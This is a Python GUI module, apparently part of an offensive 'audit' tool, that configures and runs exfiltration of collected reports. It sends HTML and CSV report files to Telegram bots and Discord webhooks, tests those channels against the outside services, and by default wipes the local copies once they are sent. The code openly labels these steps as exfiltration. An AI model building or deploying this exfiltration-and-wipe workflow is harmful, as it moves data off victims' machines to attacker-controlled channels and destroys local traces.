"""
Tab: Post-Audit
───────────────
Actions to take after a successful audit:
  • Configure Telegram & Discord exfiltration
  • Send reports to configured channels
  • Auto-wipe local files toggle
  • Connection test for each channel
"""

import threading
import customtkinter as ctk

from gui.theme import (
    COLORS, FONTS, PAD,
    make_card, make_label, make_button, make_entry,
    make_section_header, make_badge, add_clear_button, add_reveal_button
)


class PostAuditView(ctk.CTkFrame):
    """Exfiltration configuration and dispatch."""

    def __init__(self, parent):
        super().__init__(parent, fg_color="transparent")
        self._report_paths: list = []
        self._build_ui()

    # ── Public API ────────────────────────────────────────────────────────────

    def set_report_paths(self, html_path, csv_path):
        """Inject report paths after an audit completes."""
        self._report_paths = [p for p in (html_path, csv_path) if p and p.exists()]
        count = len(self._report_paths)
        if count:
            self._reports_badge.configure(
                text=f"  {count} reporte(s) listos  ",
                fg_color=COLORS["success_dim"],
                text_color=COLORS["success"],
            )
        else:
            self._reports_badge.configure(
                text="  Sin reportes  ",
                fg_color=COLORS["warning_dim"],
                text_color=COLORS["warning"],
            )

    # ── UI Construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Telegram Card ─────────────────────────────────────────────────────
        make_section_header(self, "Exfiltración por Telegram", "✈️")
        tg_card = make_card(self)
        tg_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        tg_inner = ctk.CTkFrame(tg_card, fg_color="transparent")
        tg_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        r1 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r1.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r1, "Bot Token:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._tg_token = make_entry(r1, placeholder="123456:ABC-DEF...", show="*", width=320)
        self._tg_token.pack(side="left", padx=(0, PAD["xs"]))
        
        add_reveal_button(r1, self._tg_token).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r1, self._tg_token).pack(side="left")

        r2 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r2.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r2, "Chat ID:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._tg_chat = make_entry(r2, placeholder="-100123456789", width=320)
        self._tg_chat.pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r2, self._tg_chat).pack(side="left")
        self._tg_status = make_badge(r2, "sin probar", "text_muted")
        self._tg_status.pack(side="left", padx=(PAD["lg"], 0))

        r3 = ctk.CTkFrame(tg_inner, fg_color="transparent")
        r3.pack(fill="x")
        make_button(r3, "🔌 Probar conexión", command=self._test_telegram, style="action",    width=160).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r3, "📤 Enviar reportes", command=self._send_telegram, style="primary",   width=160).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r3, "🗑 Limpiar campos",  command=self._clear_telegram, style="danger",  width=140).pack(side="left")

        # ── Discord Card ──────────────────────────────────────────────────────
        make_section_header(self, "Exfiltración por Discord", "💬")
        dc_card = make_card(self)
        dc_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        dc_inner = ctk.CTkFrame(dc_card, fg_color="transparent")
        dc_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        r4 = ctk.CTkFrame(dc_inner, fg_color="transparent")
        r4.pack(fill="x", pady=(0, PAD["sm"]))
        make_label(r4, "Webhook URL:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
        self._dc_hook = make_entry(r4, placeholder="https://discord.com/api/webhooks/...", show="*", width=320)
        self._dc_hook.pack(side="left", padx=(0, PAD["xs"]))

        add_reveal_button(r4, self._dc_hook).pack(side="left", padx=(0, PAD["xs"]))
        add_clear_button(r4, self._dc_hook).pack(side="left")
        self._dc_status = make_badge(r4, "sin probar", "text_muted")
        self._dc_status.pack(side="left", padx=(PAD["lg"], 0))

        r5 = ctk.CTkFrame(dc_inner, fg_color="transparent")
        r5.pack(fill="x")
        make_button(r5, "🔌 Probar conexión", command=self._test_discord, style="secondary", width=160).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r5, "📤 Enviar reportes", command=self._send_discord, style="primary",   width=160).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r5, "🗑 Limpiar campo",   command=self._clear_discord, style="danger",    width=160).pack(side="left")

        # ── Options Card ──────────────────────────────────────────────────────
        make_section_header(self, "Opciones de Envío", "🛡️")
        opt_card = make_card(self)
        opt_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        opt_inner = ctk.CTkFrame(opt_card, fg_color="transparent")
        opt_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        self._wipe_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            opt_inner,
            text="Auto-wipe: eliminar reportes locales tras exfiltrar",
            variable=self._wipe_var,
            fg_color=COLORS["accent"],
            hover_color=COLORS["accent_hover"],
            font=FONTS["body"],
            text_color=COLORS["text_primary"],
        ).pack(side="left", padx=(0, PAD["lg"]))

        self._send_both_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(
            opt_inner,
            text="Enviar a todos los canales configurados",
            variable=self._send_both_var,
            fg_color=COLORS["accent"],
            hover_color=COLORS["accent_hover"],
            font=FONTS["body"],
            text_color=COLORS["text_primary"],
        ).pack(side="left")

        # ── Status row ────────────────────────────────────────────────────────
        status_row = ctk.CTkFrame(self, fg_color="transparent")
        status_row.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["sm"]))
        make_label(status_row, "Reportes disponibles:", style="small", color=COLORS["text_secondary"]).pack(side="left", padx=(0, PAD["sm"]))
        self._reports_badge = make_badge(status_row, "Sin reportes", "text_muted")
        self._reports_badge.pack(side="left")

        make_button(
            status_row, "📤  Enviar a todos",
            command=self._send_all, style="success", width=160,
        ).pack(side="right", padx=PAD["sm"])

        # ── Log ───────────────────────────────────────────────────────────────
        make_section_header(self, "Log de Exfiltración", "📋")
        log_card = make_card(self)
        log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))

        log_toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
        log_toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["xs"], 0))
        make_button(log_toolbar, "🗑 Limpiar log", command=self._clear_log_box, style="danger", width=120).pack(side="left")

        self._log = ctk.CTkTextbox(
            log_card,
            fg_color=COLORS["bg_input"],
            text_color=COLORS["text_primary"],
            font=FONTS["code"],
            corner_radius=8,
            border_width=0,
            state="disabled",
        )
        self._log.pack(fill="both", expand=True, padx=PAD["sm"], pady=PAD["sm"])
        self._log._textbox.tag_configure("OK",   foreground=COLORS["success"])
        self._log._textbox.tag_configure("ERR",  foreground=COLORS["danger"])
        self._log._textbox.tag_configure("INFO", foreground=COLORS["text_primary"])
        self._log._textbox.tag_configure("MUTED",foreground=COLORS["text_muted"])

        self._log_line("MUTED", "Esperando configuración de exfiltración…")

    # ── Log helper ────────────────────────────────────────────────────────────

    def _log_line(self, tag: str, msg: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self._log.configure(state="normal")
        self._log._textbox.insert("end", f"[{ts}] ", "MUTED")
        self._log._textbox.insert("end", msg + "\n", tag)
        self._log._textbox.see("end")
        self._log.configure(state="disabled")

    # ── Clear helpers ─────────────────────────────────────────────────────────

    def _clear_telegram(self):
        self._tg_token.delete(0, "end")
        self._tg_chat.delete(0, "end")
        self._tg_status.configure(text="  sin probar  ", fg_color=COLORS["bg_card"], text_color=COLORS["text_muted"])

    def _clear_discord(self):
        self._dc_hook.delete(0, "end")
        self._dc_status.configure(text="  sin probar  ", fg_color=COLORS["bg_card"], text_color=COLORS["text_muted"])

    def _clear_log_box(self):
        self._log.configure(state="normal")
        self._log.delete("0.0", "end")
        self._log.configure(state="disabled")

    # ── Exfiltration actions ──────────────────────────────────────────────────

    def _get_exfiltrator(self):
        from main import Exfiltrator
        return Exfiltrator(
            telegram_token=self._tg_token.get() or None,
            telegram_chat_id=self._tg_chat.get() or None,
            discord_webhook=self._dc_hook.get() or None,
        )

    def _test_telegram(self):
        token = self._tg_token.get()
        chat  = self._tg_chat.get()
        if not token or not chat:
            self._log_line("ERR", "Telegram: falta token o chat ID.")
            return
        def _do():
            import requests
            try:
                r = requests.get(
                    f"https://api.telegram.org/bot{token}/getMe",
                    timeout=10,
                )
                if r.ok:
                    name = r.json().get("result", {}).get("username", "?")
                    self.after(0, lambda: self._tg_status.configure(
                        text=f"  ✓ @{name}  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]
                    ))
                    self.after(0, lambda: self._log_line("OK", f"Telegram OK — bot: @{name}"))
                else:
                    self.after(0, lambda: self._tg_status.configure(
                        text="  ✗ Error  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]
                    ))
                    self.after(0, lambda: self._log_line("ERR", f"Telegram error: {r.status_code}"))
            except Exception as e:
                self.after(0, lambda: self._log_line("ERR", f"Telegram: {e}"))
        threading.Thread(target=_do, daemon=True).start()

    def _test_discord(self):
        hook = self._dc_hook.get()
        if not hook:
            self._log_line("ERR", "Discord: falta webhook URL.")
            return
        def _do():
            import requests
            try:
                r = requests.get(hook, timeout=10)
                if r.ok:
                    name = r.json().get("name", "?")
                    self.after(0, lambda: self._dc_status.configure(
                        text=f"  ✓ #{name}  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]
                    ))
                    self.after(0, lambda: self._log_line("OK", f"Discord OK — canal: #{name}"))
                else:
                    self.after(0, lambda: self._dc_status.configure(
                        text="  ✗ Error  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]
                    ))
                    self.after(0, lambda: self._log_line("ERR", f"Discord error: {r.status_code}"))
            except Exception as e:
                self.after(0, lambda: self._log_line("ERR", f"Discord: {e}"))
        threading.Thread(target=_do, daemon=True).start()

    def _send_telegram(self):
        if not self._report_paths:
            self._log_line("ERR", "No hay reportes. Ejecutá una auditoría primero.")
            return
        exf = self._get_exfiltrator()
        def _do():
            for p in self._report_paths:
                ok = exf.send_to_telegram(p)
                msg = f"Telegram ✓ {p.name}" if ok else f"Telegram ✗ {p.name}"
                tag = "OK" if ok else "ERR"
                self.after(0, lambda m=msg, t=tag: self._log_line(t, m))
            if self._wipe_var.get():
                self._wipe_files()
        threading.Thread(target=_do, daemon=True).start()

    def _send_discord(self):
        if not self._report_paths:
            self._log_line("ERR", "No hay reportes. Ejecutá una auditoría primero.")
            return
        exf = self._get_exfiltrator()
        def _do():
            for p in self._report_paths:
                ok = exf.send_to_discord(p)
                msg = f"Discord ✓ {p.name}" if ok else f"Discord ✗ {p.name}"
                tag = "OK" if ok else "ERR"
                self.after(0, lambda m=msg, t=tag: self._log_line(t, m))
            if self._wipe_var.get():
                self._wipe_files()
        threading.Thread(target=_do, daemon=True).start()

    def _send_all(self):
        self._send_telegram()
        if self._send_both_var.get():
            self._send_discord()

    def _wipe_files(self):
        wiped = []
        for p in self._report_paths:
            try:
                p.unlink(missing_ok=True)
                wiped.append(p.name)
            except Exception:
                pass
        if wiped:
            self.after(0, lambda: self._log_line("OK", f"Wipe local: {', '.join(wiped)}"))
        self._report_paths = []
        self.after(0, lambda: self._reports_badge.configure(
            text="  Archivos eliminados  ",
            fg_color=COLORS["warning_dim"],
            text_color=COLORS["warning"],
        ))
